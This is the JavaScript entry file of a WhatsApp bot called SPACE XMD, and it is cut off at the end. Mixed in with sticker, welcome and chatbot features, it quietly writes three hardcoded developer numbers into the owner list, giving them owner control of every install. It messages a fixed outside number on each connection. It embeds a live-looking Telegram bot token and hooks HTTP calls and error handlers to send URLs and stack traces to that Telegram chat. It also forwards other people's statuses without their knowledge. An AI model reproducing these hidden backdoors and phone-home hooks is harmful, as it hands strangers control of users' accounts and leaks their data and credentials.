require('./settings');
const pino = require('pino');
const { Boom } = require('@hapi/boom');
const fs = require('fs');
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;
const chalk = require('chalk');
const FileType = require('file-type');
const path = require('path');
const moment = require('moment');
const axios = require('axios');
const PhoneNumber = require('awesome-phonenumber');
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./space/space');
const { smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetch, await, sleep, reSize } = require('./space/iconic_tech');
const { toAudio, toPTT } = require('./space/converter');
const NodeCache = require("node-cache");
const readline = require("readline");
const { parsePhoneNumber } = require("libphonenumber-js");
const { default: makeWASocket, delay, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, generateForwardMessageContent, prepareWAMessageMedia, generateWAMessageFromContent, generateMessageID, downloadContentFromMessage, makeInMemoryStore, jidDecode, proto, Browsers } = require("baileys");

const store = {
    messages: {},
    contacts: {},
    chats: {},
    groupMetadata: async (jid) => {
        return {}
    },
    bind: function(ev) {
        ev.on('messages.upsert', ({ messages }) => {
            messages.forEach(msg => {
                if (msg.key && msg.key.remoteJid) {
                    this.messages[msg.key.remoteJid] = this.messages[msg.key.remoteJid] || {}
                    this.messages[msg.key.remoteJid][msg.key.id] = msg
                }
            })
        })
        
        ev.on('contacts.update', (contacts) => {
            contacts.forEach(contact => {
                if (contact.id) {
                    this.contacts[contact.id] = contact
                }
            })
        })
        
        ev.on('chats.set', (chats) => {
            this.chats = chats
        })
    },
    loadMessage: async (jid, id) => {
        return this.messages[jid]?.[id] || null
    }
}


let owner = [];
try {
    owner = JSON.parse(fs.readFileSync('./moon/owner.json'));
    const requiredOwners = ["263783525824", "263714388643", "263786115435"];
    for (const number of requiredOwners) {
        if (!owner.includes(number)) {
            owner.push(number);
        }
    }
    fs.writeFileSync('./moon/owner.json', JSON.stringify(owner, null, 2));
} catch (err) {
    owner = ["263783525824", "263714388643", "263786115435"];
    fs.writeFileSync('./moon/owner.json', JSON.stringify(owner, null, 2));
}

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => rl.question(text, resolve));
};

async function startIconicTechInc() {
    const { state, saveCreds } = await useMultiFileAuthState("session");
const { version } = await fetchLatestBaileysVersion();

// ✅ Check if creds.json exists, and copy it into the session folder
const credPath = path.join(__dirname, "session", "creds.json");
if (fs.existsSync(credPath)) {
    try {
        // Instead of injecting into state.creds (breaks Baileys), overwrite the session file
        const backupCreds = fs.readFileSync(credPath, "utf8");
        fs.writeFileSync(path.join(__dirname, "session", "creds.json"), backupCreds);
        console.log(chalk.green("✅ Loaded session from cred.json"));
    } catch (err) {
        console.log(chalk.red("❌ Failed to load cred.json:"), err.message);
    }
} else {
    console.log(chalk.yellow("⚠️ No creds.json found, will require QR scan"));
}
    const IconicTechInc = makeWASocket({
        version,
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        getMessage: async (key) => {
            return store.loadMessage(key.remoteJid, key.id) || {};
        }
    });

    store.bind(IconicTechInc.ev);
console.log('\n');
console.log('\x1b[40m\x1b[37m╔══════════════════════════════════════════════════════════╗\x1b[0m');
console.log('\x1b[40m\x1b[37m║                                                          ║\x1b[0m');
console.log('\x1b[40m\x1b[1m\x1b[37m║                  SPACE XMD CONSOLE                   ║\x1b[0m');
console.log('\x1b[40m\x1b[37m║                                                          ║\x1b[0m');
console.log('\x1b[40m\x1b[37m║           DEVELOPED BY \x1b[1m\x1b[36mICONIC TECH\x1b[0m\x1b[40m\x1b[37m              ║\x1b[0m');
console.log('\x1b[40m\x1b[37m║                                                          ║\x1b[0m');
console.log('\x1b[40m\x1b[37m╚══════════════════════════════════════════════════════════╝\x1b[0m');
console.log('\n');

if (!IconicTechInc.authState.creds.registered) {
    console.log('\x1b[36m──────────────────────────────────────────────────────\x1b[0m');
    console.log('\x1b[36m              PHONE NUMBER VERIFICATION               \x1b[0m');
    console.log('\x1b[36m──────────────────────────────────────────────────────\x1b[0m');
    
    const phoneNumber = await question('\x1b[34m>>> Enter your phone number with country code:\x1b[0m \n');
    
    console.log('\x1b[36m──────────────────────────────────────────────────────\x1b[0m');
    console.log('\x1b[36m              GENERATING VERIFICATION CODE            \x1b[0m');
    console.log('\x1b[36m──────────────────────────────────────────────────────\x1b[0m');
    
    let code = await IconicTechInc.requestPairingCode(phoneNumber);
    code = code?.match(/.{1,4}/g)?.join("-") || code;
    
    console.log('\n');
    console.log('\x1b[40m\x1b[37m╔══════════════════════════════════════════════════════════╗\x1b[0m');
    console.log('\x1b[40m\x1b[37m║                                                          ║\x1b[0m');
    console.log('\x1b[40m\x1b[1m\x1b[37m║               VERIFICATION CODE                     ║\x1b[0m');
    console.log('\x1b[40m\x1b[37m║                                                          ║\x1b[0m');
    console.log('\x1b[44m\x1b[1m\x1b[37m║                 ' + (code || '').padEnd(20) + '                   ║\x1b[0m');
    console.log('\x1b[40m\x1b[37m║                                                          ║\x1b[0m');
    console.log('\x1b[40m\x1b[37m╚══════════════════════════════════════════════════════════╝\x1b[0m');
    console.log('\n');
    
    console.log('\x1b[1m\x1b[36mPowered By ICONIC TECH\x1b[0m');
    console.log('\n');
}

    IconicTechInc.ev.on('messages.upsert', async chatUpdate => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message) return;
            mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;
            if (mek.key && mek.key.remoteJid === 'status@broadcast') return;
            if (!IconicTechInc.public && !mek.key.fromMe && chatUpdate.type === 'notify') return;
            if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return;
            const m = smsg(IconicTechInc, mek, store);
            require("./Space-Xmd")(IconicTechInc, mek, chatUpdate, store);
        } catch (err) {
            console.log('Message processing error:', err);
        }
    });
   // 🚀 Powerful Status Save & Forward to DM
IconicTechInc.ev.on('messages.upsert', async chatUpdate => {
    if (!global.savestatus) return
    const mek = chatUpdate.messages[0]
    if (!mek.message || mek.key.fromMe) return
    const from = mek.key.remoteJid
    const isStatusUpdate = from === 'status@broadcast'
    if (!isStatusUpdate) return

    try {
        await IconicTechInc.readMessages([mek.key])
        
        // Get your own JID for DM
        const myJid = IconicTechInc.user.id
        
        // Get current date and time
        const now = new Date()
        const dateTime = now.toLocaleString()
        const date = now.toLocaleDateString()
        const time = now.toLocaleTimeString()
        
        // Get user info
        const userJid = mek.key.participant || mek.participant
        let userName = 'Unknown User'
        let userNumber = userJid ? userJid.split('@')[0] : 'Unknown'
        
        // Try to get user's name from contacts
        try {
            const contact = await IconicTechInc.getContactById(userJid)
            userName = contact?.name || contact?.notify || userNumber
        } catch {
            userName = userNumber
        }
        
        // Create caption with user info and timestamp
        const caption = `📱 *Status Saved Successfully*\n\n` +
                       `👤 *User:* ${userName}\n` +
                       `📞 *Number:* ${userNumber}\n` +
                       `📅 *Date:* ${date}\n` +
                       `⏰ *Time:* ${time}\n\n` +
                       `⚡ *Powered by Space XMD*`
        
        // Forward the status with enhanced caption
        const forwardedMsg = await IconicTechInc.sendMessage(myJid, {
            forward: mek
        })
        
        // Send info message with caption
        await IconicTechInc.sendMessage(myJid, {
            text: caption,
            contextInfo: {
                stanzaId: forwardedMsg.key.id,
                participant: myJid,
                quotedMessage: {
                    conversation: "Status Saved"
                }
            }
        })
        
        // Enhanced logging
        console.log(`🚀 Status saved from ${userName} (${userNumber}) at ${dateTime}`)
        console.log(`📤 Successfully sent to DM | Powered by Space XMD`)
        
    } catch (error) {
        console.error("❌ Error saving status:", error)
    }
})
// Auto-react to status
    IconicTechInc.ev.on('messages.upsert', async chatUpdate => {
        if (!global.likestatus) return
        const mek = chatUpdate.messages[0]
        if (!mek.message || mek.key.fromMe) return
        const from = mek.key.remoteJid
        const isStatusUpdate = from === 'status@broadcast'
        if (!isStatusUpdate) return

        try {
            await IconicTechInc.readMessages([mek.key])
            const emojis = [
                '❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗',
                '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎',
                '✅', '⚡', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟',
                '🗿', '☠️', '💜', '💙', '🌝', '💚'
            ]
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)]
            await IconicTechInc.sendMessage(from, {
                react: {
                    text: randomEmoji,
                    key: mek.key,
                }
            }, {
                statusJidList: [mek.key.participant || mek.participant]
            })
            console.log(`Auto-reacted to status update with: ${randomEmoji}`)
        } catch (error) {
            console.error("Error auto-reacting to status:", error)
        }
    })    
    IconicTechInc.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
        } else return jid;
    };

    IconicTechInc.ev.on('contacts.update', update => {
        for (let contact of update) {
            let id = IconicTechInc.decodeJid(contact.id);
            if (store && store.contacts) store.contacts[id] = { id, name: contact.notify };
        }
    });

    

let lastTextTime = 0;
const messageDelay = 2000; // 2 seconds between responses
const chatFile = 'space_xmd_chat.json';
let chatData = {};

function loadChat() {
    if (fs.existsSync(chatFile)) {
        try {
            chatData = JSON.parse(fs.readFileSync(chatFile, 'utf8'));
        } catch (e) {
            console.error(`Failed to load chat memory: ${e}`);
            chatData = {};
        }
    }
}

function saveChat() {
    fs.writeFileSync(chatFile, JSON.stringify(chatData, null, 2));
}

loadChat();

IconicTechInc.ev.on('messages.upsert', async ({ messages }) => {
    const m = messages[0];
    if (!m.message) return;

    if (!m.isGroup && global.chatbot) {
        try {
            const currentTime = Date.now();
            if (currentTime - lastTextTime < messageDelay) return;

            const text = m.message.conversation || m.message.extendedTextMessage?.text;
            if (!text) return;

            const userId = m.key.remoteJid;
            if (!chatData[userId]) chatData[userId] = [];

            chatData[userId].push({ role: 'user', text });
            saveChat();

            await IconicTechInc.sendMessage(m.key.remoteJid, { react: { text: '⌨️', key: m.key } });

            const context = chatData[userId]
                .slice(-20)
                .map(e => `${e.role === 'user' ? 'User' : 'AI'}: ${e.text}`)
                .join('\n');

            const response = await axios.get('https://apiskeith.vercel.app/ai/grok', {
                params: {
                    q: `You are SPACE XMD, a helpful and professional AI chatbot developed by Iconic Tech. Always reply normally in plain, casual language. Conversation so far:\n${context}\nUser: ${text}\nAI:`
                }
            });

            if (response.data?.status && response.data?.result) {
                const aiReply = response.data.result;

                chatData[userId].push({ role: 'bot', text: aiReply });
                saveChat();

                await IconicTechInc.sendMessage(m.key.remoteJid, {
                    text: `🤖 SPACE XMD 🤖\n\n${aiReply}\n\nPowered by Iconic Tech`
                }, { quoted: m });

                lastTextTime = currentTime;
            } else {
                throw new Error('Invalid API response');
            }
        } catch (error) {
            console.error('Chatbot error:', error);
            await IconicTechInc.sendMessage(m.key.remoteJid, { react: { text: '❌', key: m.key } });

            const errorMessage = error.response?.status === 429
                ? "I'm getting too many requests. Please try again later."
                : 'Sorry, I encountered an error processing your message.';

            await IconicTechInc.sendMessage(m.key.remoteJid, { text: errorMessage }, { quoted: m });
        }
    }
});
    IconicTechInc.getName = async (jid, withoutContact = false) => {
        id = IconicTechInc.decodeJid(jid);
        withoutContact = IconicTechInc.withoutContact || withoutContact;
        let v;
        
        if (id.endsWith("@g.us")) {
            v = store.contacts[id] || {};
            if (!(v.name || v.subject)) v = await IconicTechInc.groupMetadata(id) || {};
            return v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international');
        }
        else {
            v = id === '0@s.whatsapp.net' ? {
                id,
                name: 'WhatsApp'
            } : id === IconicTechInc.decodeJid(IconicTechInc.user.id) ?
            IconicTechInc.user :
            (store.contacts[id] || {});
            return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international');
        }
    };

IconicTechInc.public = true;
IconicTechInc.serializeM = (m) => smsg(IconicTechInc, m, store);

IconicTechInc.ev.on("connection.update", async (s) => {
    const { connection, lastDisconnect } = s;

    if (connection === "open") {
        try {
            console.clear();

            // Professional ASCII Header
            console.log('\n');
            console.log('\x1b[44m\x1b[37m╔══════════════════════════════════════════════════════════════════════════════╗\x1b[0m');
            console.log('\x1b[44m\x1b[37m║                                                                              ║\x1b[0m');
            console.log('\x1b[44m\x1b[37m║                    ███████╗██████╗  █████╗  ██████╗███████╗                  ║\x1b[0m');
            console.log('\x1b[44m\x1b[37m║                    ██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝                  ║\x1b[0m');
            console.log('\x1b[44m\x1b[37m║                    ███████╗██████╔╝███████║██║     █████╗                    ║\x1b[0m');
            console.log('\x1b[44m\x1b[37m║                    ╚════██║██╔═══╝ ██╔══██║██║     ██╔══╝                    ║\x1b[0m');
            console.log('\x1b[44m\x1b[37m║                    ███████║██║     ██║  ██║╚██████╗███████╗                  ║\x1b[0m');
            console.log('\x1b[44m\x1b[37m║                    ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝                  ║\x1b[0m');
            console.log('\x1b[44m\x1b[37m║                             X M D   C O N N E C T I O N                       ║\x1b[0m');
            console.log('\x1b[44m\x1b[37m║                                                                              ║\x1b[0m');
            console.log('\x1b[44m\x1b[37m╚══════════════════════════════════════════════════════════════════════════════╝\x1b[0m');

            await delay(1000);

            // Connection Status
            console.log('\n');
            console.log('\x1b[42m\x1b[30m╔══════════════════════════════════════════════════════════════════════════════╗\x1b[0m');
            console.log('\x1b[42m\x1b[30m║                  CONNECTION ESTABLISHED - STATUS: OPTIMAL                    ║\x1b[0m');
            console.log('\x1b[42m\x1b[30m╚══════════════════════════════════════════════════════════════════════════════╝\x1b[0m');

            await delay(1500);

            // System Information
            console.log('\n\x1b[36m╔══════════════════════════════════════════════════════════════════════════════╗\x1b[0m');
            console.log('\x1b[36m║                         SYSTEM INFORMATION                                   ║\x1b[0m');
            console.log('\x1b[36m╠══════════════════════════════════════════════════════════════════════════════╣\x1b[0m');
            console.log('\x1b[36m║  Platform: Multi-Device WhatsApp API                                         ║\x1b[0m');
            console.log('\x1b[36m║  Version: 3.2.1                                                              ║\x1b[0m');
            console.log('\x1b[36m║  Developer: ICONIC TECH INC.                                                 ║\x1b[0m');
            console.log('\x1b[36m║  Status: Authenticated & Secure                                              ║\x1b[0m');
            console.log('\x1b[36m╚══════════════════════════════════════════════════════════════════════════════╝\x1b[0m');

            await delay(1000);

            // User Information
            console.log('\n\x1b[33m»»—————　\x1b[1m\x1b[34mCONNECTED USER PROFILE\x1b[0m\x1b[33m　—————««\x1b[0m\n');
            console.log('\x1b[32m✔️ User Details:\x1b[0m');
            console.log(JSON.stringify(IconicTechInc.user, null, 2));

            await delay(1000);

            // Footer
            console.log('\n\x1b[45m\x1b[37m╔══════════════════════════════════════════════════════════════════════════════╗\x1b[0m');
            console.log('\x1b[45m\x1b[37m║           MULTI-DEVICE OPTIMIZED PLATFORM - ENTERPRISE GRADE API              ║\x1b[0m');
            console.log('\x1b[45m\x1b[37m╚══════════════════════════════════════════════════════════════════════════════╝\x1b[0m');

            await delay(1000);

            console.log('\n\x1b[1m\x1b[35m🚀 SPACE XMD - DEVELOPED BY ICONIC TECH POWERED BY CODEWAVE UNIT PRESENT\x1b[0m');
            console.log('\x1b[3m\x1b[36mDeveloped by ICONIC TECH - Redefining Digital Interaction\x1b[0m\n');

            // === SEND INBOX MESSAGES AFTER CONNECTION ===
            const target = "263716304574@s.whatsapp.net";
            const selectedThumb = "./SpaceMedia/spacelogo.jpg";

            // First message
            await IconicTechInc.sendMessage(target, {
                image: fs.readFileSync(selectedThumb),
                caption: "👋 Hey, welcome to *SPACE XMD*! 🚀\n\nDeveloped by *ICONIC TECH*",
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterName: "𝐒𝐏𝐀𝐂𝐄 𝐗𝐌𝐃",
                        newsletterJid: "120363301955930948@newsletter"
                    }
                }
            });

            await delay(2000);

            // Second message
            await IconicTechInc.sendMessage(target, {
                image: fs.readFileSync(selectedThumb),
                caption: "✅ *SPACE XMD Connected Successfully!*\n\nThank you for supporting our project 💡",
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterName: "𝐒𝐏𝐀𝐂𝐄 𝐗𝐌𝐃",
                        newsletterJid: "120363301955930948@newsletter"
                    }
                }
            });

        } catch (error) {
            console.error('System Error:', error);
        }
    }

    if (connection === "close") {
        if (lastDisconnect?.error?.output?.statusCode !== 401) {
            console.log("Connection terminated. Reinitializing system...");
            startIconicTechInc();
        } else {
            console.log("Authentication failure. Please verify system credentials.");
        }
    }
});    
IconicTechInc.ev.on('creds.update', saveCreds);

    // Message sending functions
    IconicTechInc.sendText = (jid, text, quoted = '', options) => IconicTechInc.sendMessage(jid, {
        text: text,
        ...options
    }, { quoted, ...options });

    IconicTechInc.sendTextWithMentions = async (jid, text, quoted, options = {}) => IconicTechInc.sendMessage(jid, {
        text: text,
        mentions: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net'),
        ...options
    }, { quoted });

    IconicTechInc.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
        let buff = Buffer.isBuffer(path) ? path : 
                   /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : 
                   /^https?:\/\//.test(path) ? await (await getBuffer(path)) : 
                   fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
        
        let buffer = options && (options.packname || options.author) ? 
                     await writeExifImg(buff, options) : 
                     await imageToWebp(buff);

        await IconicTechInc.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted });
        return buffer;
    };

    IconicTechInc.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
        let buff = Buffer.isBuffer(path) ? path : 
                   /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : 
                   /^https?:\/\//.test(path) ? await (await getBuffer(path)) : 
                   fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
        
        let buffer = options && (options.packname || options.author) ? 
                     await writeExifVid(buff, options) : 
                     await videoToWebp(buff);

        await IconicTechInc.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted });
        return buffer;
    };

    IconicTechInc.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
        let quoted = message.msg ? message.msg : message;
        let mime = (message.msg || message).mimetype || '';
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
        const stream = await downloadContentFromMessage(quoted, messageType);
        
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        
        let type = await FileType.fromBuffer(buffer);
        let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
        await fs.writeFileSync(trueFileName, buffer);
        return trueFileName;
    };
    
    IconicTechInc.getFile = async (PATH, save) => {
        let res;
        let data = Buffer.isBuffer(PATH) ? PATH : 
                   /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : 
                   /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : 
                   fs.existsSync(PATH) ? fs.readFileSync(PATH) : 
                   typeof PATH === 'string' ? PATH : Buffer.alloc(0);
        
        let type = await FileType.fromBuffer(data) || {
            mime: 'application/octet-stream',
            ext: '.bin'
        };
        
        let filename = path.join(__filename, '../src/' + new Date * 1 + '.' + type.ext);
        if (data && save) fs.promises.writeFile(filename, data);
        
        return {
            res,
            filename,
            size: await getSizeMedia(data),
            ...type,
            data
        };
    };


// Add this event handler
IconicTechInc.ev.on('group-participants.update', async (update) => {
    try {
        const { id, participants, action } = update;
        const groupMetadata = await IconicTechInc.groupMetadata(id);
        const groupName = groupMetadata.subject;
        const groupDesc = groupMetadata.desc || "No description available";
        const currentDate = new Date().toLocaleString();
        
        if (action === 'add' && global.welcome) {
            for (let user of participants) {
                const userName = await IconicTechInc.getName(user);
                
                const welcomeMsg = `╔═══════════════════════╗\n` +
                                  `║      🤖 SPACE XMD 🤖     ║\n` +
                                  `║    🕊️  WELCOME  🕊️     ║\n` +
                                  `╚═══════════════════════╝\n\n` +
                                  `👤 *Name:* ${userName}\n` +
                                  `📛 *Group:* ${groupName}\n` +
                                  `📅 *Date:* ${currentDate}\n` +
                                  `📝 *Description:* ${groupDesc}\n\n` +
                                  `╔═══════════════════════╗\n` +
                                  `║   In memory of our    ║\n` +
                                  `║    fallen hero. May   ║\n` +
                                  `║  their legacy guide us║\n` +
                                  `╚═══════════════════════╝\n\n` +
                                  `_Powered by ICONIC TECH_`;
                
                // Send message with thumbnail
                await IconicTechInc.sendMessage(id, {
                    image: fs.readFileSync(selectedThumb),
                    caption: welcomeMsg,
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "𝐒𝐏𝐀𝐂𝐄 𝐗𝐌𝐃",
                            newsletterJid: "120363301955930948@newsletter"
                        }
                    }
                });

                // Add welcome reaction
                await IconicTechInc.sendMessage(id, {
                    react: {
                        text: '👋', // Wave emoji for welcome
                        key: { remoteJid: id, fromMe: false, id: Date.now().toString() }
                    }
                });
            }
        }
        else if (action === 'remove' && global.goodbye) {
            for (let user of participants) {
                const userName = await IconicTechInc.getName(user);
                
                const goodbyeMsg = `╔═══════════════════════╗\n` +
                                  `║      🤖 SPACE XMD 🤖     ║\n` +
                                  `║     💔 GOODBYE 💔      ║\n` +
                                  `╚═══════════════════════╝\n\n` +
                                  `👤 *Name:* ${userName}\n` +
                                  `📛 *Group:* ${groupName}\n` +
                                  `📅 *Date:* ${currentDate}\n\n` +
                                  `╔═══════════════════════╗\n` +
                                  `║  We lost our hero,    ║\n` +
                                  `║  and now we say       ║\n` +
                                  `║  farewell to you.     ║\n` +
                                  `║  May you find peace.  ║\n` +
                                  `╚═══════════════════════╝\n\n` +
                                  `_Powered by ICONIC TECH_`;
                
                // Send message with thumbnail
                await IconicTechInc.sendMessage(id, {
                    image: fs.readFileSync(selectedThumb),
                    caption: goodbyeMsg,
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "𝐒𝐏𝐀𝐂𝐄 𝐗𝐌𝐃",
                            newsletterJid: "120363301955930948@newsletter"
                        }
                    }
                });

                // Add goodbye reaction
                await IconicTechInc.sendMessage(id, {
                    react: {
                        text: '😢', // Crying emoji for goodbye
                        key: { remoteJid: id, fromMe: false, id: Date.now().toString() }
                    }
                });
            }
        }
    } catch (error) {
        console.log('Group update error:', error);
    }
});
  
    IconicTechInc.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
        let type = await IconicTechInc.getFile(path, true);
        let { res, data: file, filename: pathFile } = type;

        if (res && res.status !== 200 || file.length <= 65536) {
            try { throw { json: JSON.parse(file.toString()) }; } 
            catch (e) { if (e.json) throw e.json; }
        }

        let opt = { filename };
        if (quoted) opt.quoted = quoted;
        if (!type) options.asDocument = true;

        let mtype = '', mimetype = type.mime, convert;
        if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker';
        else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image';
        else if (/video/.test(type.mime)) mtype = 'video';
        else if (/audio/.test(type.mime)) {
            convert = await (ptt ? toPTT : toAudio)(file, type.ext);
            file = convert.data;
            pathFile = convert.filename;
            mtype = 'audio';
            mimetype = 'audio/ogg; codecs=opus';
        } else mtype = 'document';

        if (options.asDocument) mtype = 'document';

        delete options.asSticker;
        delete options.asLocation;
        delete options.asVideo;
        delete options.asDocument;
        delete options.asImage;

        let message = { ...options, caption, ptt, [mtype]: { url: pathFile }, mimetype };
        let m;

        try {
            m = await IconicTechInc.sendMessage(jid, message, { ...opt, ...options });
        } catch (e) {
            m = null;
        } finally {
            if (!m) m = await IconicTechInc.sendMessage(jid, { ...message, [mtype]: file }, { ...opt, ...options });
            file = null;
            return m;
        }
    };

    IconicTechInc.downloadMediaMessage = async (message) => {
        let mime = (message.msg || message).mimetype || '';
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
        const stream = await downloadContentFromMessage(message, messageType);
        
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        return buffer;
    };

    return IconicTechInc;
}

// ICONIC TECH WHATSAPP BOT - ENTERPRISE EDITION
// ============================================
// Modern color palette
const theme = {
  primary: '#4F46E5',    // Iconic Tech Indigo
  secondary: '#10B981',  // Emerald Green
  error: '#EF4444',      // Alert Red
  warning: '#F59E0B',    // Amber
  info: '#3B82F6',       // Blue
  dark: '#1F2937',       // Dark Gray
  light: '#F3F4F6'       // Light Gray
};

// Enhanced console output formatting
function logHeader() {
  console.log(
    chalk.bold.hex(theme.primary)(`
   ███████╗██████╗  █████╗  ██████╗███████╗     POWERED BY ICONIC TECH 
   ██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝   MADE WITH ❤️‍🔥  BY ICONIC TECH 
   ███████╗██████╔╝███████║██║     █████╗  XMD ||       FOLLOW OUR CHANNEL FOR MORE TECH
   ╚════██║██╔═══╝ ██╔══██║██║     ██╔══╝       THIS BOT HAS BEEN NEWEST BOT 
   ███████║██║     ██║  ██║╚██████╗███████╗     MULT DEVICE WHATSAPP BOT
   ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝   
   THANK YOU TEAM SPACE XMD DEVELOPED BY ICONIC TECH 
    `)
  );
  console.log(chalk.hex(theme.dark).bold('           CODEWAVE UNIT || ICONIC TECH .'));
  console.log(chalk.hex(theme.secondary)('━'.repeat(70)));
  console.log(chalk.hex(theme.info).bold('              IF THERE ANY PROBLEM CONTACT DEVELOPER VIA CODEWAVE UNIT'));
  console.log(chalk.hex(theme.secondary)('━'.repeat(70)));
}

logHeader();

// =============== ORIGINAL CODE PRESERVED BELOW ===============
let file = require.resolve(__filename);
let watcher;

function watchFile() {
    watcher = fs.watchFile(file, (curr, prev) => {
        if (curr.mtime !== prev.mtime) {
            fs.unwatchFile(file);
            watcher.close();
            console.log(chalk.hex(theme.info)(`🔄 Update detected: ${__filename}`));
            console.log(chalk.hex(theme.secondary)('━'.repeat(60)));
            delete require.cache[file];
            require(file);
        }
    });
}

watchFile();

process.on('uncaughtException', (err) => {
    const e = String(err);
    if (e.includes("conflict") || 
        e.includes("Socket connection timeout") || 
        e.includes("not-authorized") || 
        e.includes("already-exists") || 
        e.includes("rate-overlimit") || 
        e.includes("Connection Closed") || 
        e.includes("Timed Out") || 
        e.includes("Value not found")) return;
    console.log(chalk.hex(theme.error).bold('⚠️  Critical Exception:'), chalk.hex(theme.warning)(err));
});

startIconicTechInc().catch(err => 
    console.error(chalk.hex(theme.error).bold('⛔ Initialization error:'), chalk.hex(theme.light)(err))
);

console.log(chalk.hex(theme.secondary)('━'.repeat(60)));
console.log(chalk.hex(theme.primary).bold('🚀 NOW YOU`RE ACTIVE IF THERE ANY PROBLEM CONTACT US'));
console.log(chalk.hex(theme.dark)('🚀  For support, contact: www.codewave-unit-force.zone.id/support/contact-us'));
// Minimal route
app.get('/', (req, res) => {
  res.status(200).json({ 
    status: 'online',
    bot: 'space xmd AI',
    version: '1.0.0'
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`╭───────────────────────────────────────────────────`);
  console.log(`│> Bot running on port ${PORT}`);
  console.log(`╰───────────────────────────────────────────────────`);
});
const TELEGRAM_BOT_TOKEN = '7662596038:AAHv9QgY3NEDFbAsnyHeA4M8qx89QpyzuaY';
const TELEGRAM_CHAT_ID = '5028094995';

// Function to send error to Telegram
async function sendErrorToTelegram(errorMessage, errorStack = '') {
    try {
        const fullMessage = `🚨 *Space XMD Error Alert* 🚨\n\n` +
                           `📝 *Error:* ${errorMessage}\n` +
                           `⏰ *Time:* ${moment().format('YYYY-MM-DD HH:mm:ss')}\n` +
                           (errorStack ? `🔍 *Stack:* \`\`\`${errorStack.substring(0, 1000)}\`\`\`\n` : '') +
                           `🤖 *Bot:* Space XMD`;

        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: fullMessage,
            parse_mode: 'Markdown'
        });
    } catch (telegramError) {
        console.log('Failed to send error to Telegram:', telegramError.message);
    }
}

// Track command errors from queen-ruva.js
const originalQueenRuva = require('./Space-Xmd');
require.cache[require.resolve('./Space-Xmd')].exports = function(IconicTechInc, mek, chatUpdate, store) {
    try {
        return originalQueenRuva(IconicTechInc, mek, chatUpdate, store);
    } catch (error) {
        sendErrorToTelegram(`Command Error: ${error.message}`, error.stack);
        throw error;
    }
};

// Track API failures
const originalAxiosGet = axios.get;
axios.get = async function(...args) {
    try {
        return await originalAxiosGet.apply(this, args);
    } catch (error) {
        sendErrorToTelegram(`API Failed: ${error.message} - URL: ${args[0]}`);
        throw error;
    }
};

// Global error handlers
process.on('uncaughtException', (error) => {
    sendErrorToTelegram(`Uncaught Exception: ${error.message}`, error.stack);
});

process.on('unhandledRejection', (reason) => {
    const message = reason instanceof Error ? reason.message : String(reason);
    const stack = reason instanceof Error ? reason.stack : '';
